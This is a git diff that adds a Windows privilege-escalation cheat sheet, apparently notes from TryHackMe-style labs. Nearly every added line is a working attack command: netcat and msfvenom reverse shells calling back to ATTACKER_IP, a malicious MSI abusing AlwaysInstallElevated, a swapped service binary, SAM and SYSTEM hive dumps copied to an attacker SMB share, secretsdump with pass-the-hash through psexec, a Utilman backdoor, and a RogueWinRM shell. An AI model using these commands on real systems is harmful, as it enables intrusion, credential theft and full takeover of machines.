@@ -240,16 +240,100 @@ runas /savecred /user:admin cmd.exe
 reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 
 
+: Quick wins
 
+-> Scheduled Tasks
 
+schtasks
+-> View all scheduled tasks
+schtasks /query /tn <name>
+-> View only the task with the specified taskname (tn)
+schtasks /query /tn <name> /fo list /v
+-> View only the task with the specified taskname with full and more verbose information list
+icalcs <file path>
+-> Check permissions for the found "task to run" executable
+C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
+-> Modifiy the bat file with our reverse shell script
+schtasks /run /tn vulntask
+-> Run the specified task
 
+-> AlwaysInstalledElevated (msi), can be configured to run with higher privileges from any user account 
 
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+-> Both key need to be set for this to work
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.96.0 LPORT=LOCAL_PORT -f msi -o malicious.msi
+-> Create malicious msi file with msi venom and start the msf console
+msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+-> Execute the msi on the target system
 
+: Service Misconfigurations
 
+-> Insecure Permissions on Service Executable
 
+sc qc WindowsScheduler
+-> Query the service configuration for WindowsScheduler service
+icacls C:\PROGRA~2\SYSTEM~1\WService.exe
+-> Check permissions for the BINARY_PATH_NAME
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
+-> Create payload and send to system with http server
+-> Create backup of the original file and move the malicious file in place
+icacls WService.exe /grant Everyone:F
+-> Grant full permission to the Everyone group
+sc stop/start <service name>
+-> Stop and start the modified service to receive a reverse shell
 
+: Dangerous Privileges
 
+whoami /priv
+-> Check your windows accounts privileges
+-> https://github.com/gtworek/Priv2Admin
+-> Comprehensive list of exploitable privileges
 
+-> List of usable privileges if set
+
+SeBackup / SeRestore
+
+-> Read and write to and from any file on the system
+reg save hklm\system C:\<folder>\system.hive
+reg save hklm\sam C:\<folder>\sam.hive
+-> Backup the SYSTEM and SAM registry hives.
+mkdir share
+python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+-> Create new folder to share through SMB to copy over the hives. Credentials used are those of the target machine.
+copy C:\<folder>\THMBackup\sam.hive \\ATTACKER_IP\public\
+copy C:\<folder>\system.hive \\ATTACKER_IP\public\
+-> Transfer the hives to the attacker machine.
+python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+-> Use Impacket to extract the administrators password hash.
+python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@<ip>
+-> Pass the hash attack with PSexec using the admin hash
+
+SeTakeOwnership
+
+-> Take ownership of any object on the system, including files and registry keys.
+takeown /f C:\Windows\System32\Utilman.exe
+-> Take ownership of utilman executable
+icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+-> Give our account full privileges over the executable
+copy cmd.exe utilman.exe
+-> Replace the executabel with a copy of cmd.exe
+-> Lock the screen and start ease of access to start utilman (cmd)
+
+SeImpersonate / SeAssignPrimaryToken
+
+-> Impersonate other users and act on their behalf
+-> Next example we have a webshell with a user that has these privileges
+nc -nlvp 1337
+-> Start listener on the attack machine.
+RogueWinRM.exe -p "C:\Tools\nc64.exe" -a "-e cmd.exe 10.18.78.136 1337"
+-> Start RogueWinRM an the target machine, which starts netcat with arguments a
+
+Programs to add to commands file:
+
+Impacket-smbserver
+Impacket-psexec
+Impacket-secretsdump
 
 -> Unquoted Service Paths
 
